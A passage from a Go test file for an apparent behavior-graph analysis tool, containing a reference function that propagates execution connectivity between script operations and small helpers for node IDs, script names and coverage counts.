				t.Fatalf("trial %d operation %d execution = %#v, reference %#v", trial, i, graph.Operations[i].Execution, reference.Operations[i].Execution)
			}
		}
	}
}

func resolveScriptOperationTargetsReference(graph *behavior.Graph, contents []artifact.Content) {
	byLogical := map[string]artifact.Content{}
	byNode := map[string]artifact.Content{}
	for _, content := range contents {
		byLogical[content.LogicalPath] = content
		byNode[content.NodeID] = content
	}
	for {
		changed := false
		for _, operation := range graph.Operations {
			if operation.Execution.Connectivity != behavior.ConnectivityConnected || !scriptTargetSourceOperation(operation) {
				continue
			}
			source, ok := byNode[operation.SubjectNodeID]
			if !ok {
				continue
			}
			for _, target := range []string{operation.RequiredResource().Value} {
				logical := target
				targetContent, ok := byLogical[logical]
				if !ok || targetContent.NodeID == source.NodeID {
					continue
				}
				if promoteNodeOperations(graph, targetContent.NodeID, operation.Execution) {
					changed = true
				}
			}
		}
		if !changed {
			return
		}
	}
}

func testNodeID(index int) string {
	return "node-" + string(rune('a'+index))
}

func testScriptName(index int) string {
	return "script-" + string(rune('a'+index)) + ".sh"
}

func countCoverageDetail(coverage []behavior.Coverage, area, detail string) int {
	count := 0
	for _, record := range coverage {
		if record.AnalysisArea == area && record.Status == "partial" && record.Detail == detail {
			count++
		}
	}
	return count
}
